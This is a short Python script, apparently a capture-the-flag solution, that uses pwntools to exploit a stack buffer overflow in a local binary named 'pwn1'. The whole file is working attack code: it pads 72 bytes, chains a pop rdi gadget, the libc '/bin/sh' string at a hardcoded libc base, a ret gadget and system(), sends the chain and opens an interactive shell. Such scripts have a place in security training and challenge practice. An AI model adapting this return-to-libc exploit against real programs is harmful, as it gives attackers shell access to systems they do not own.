#!/usr/bin/env python3
from pwn import *

p = process('./pwn1')

binary = ELF('./pwn1')
context.binary = binary
rop = ROP(binary)

libc = ELF('/usr/lib/libc.so.6')
libc.address = 0x7ffff7dc3000

pop_rdi = 0x400783
ret = 0x400784

rop.raw('A' * 72)
rop.raw(pop_rdi)
rop.raw(next(libc.search(b'/bin/sh')))
rop.raw(ret)
rop.raw(libc.symbols['system'])

p.recvuntil(b'buffer:')
p.sendline(rop.chain())

p.interactive()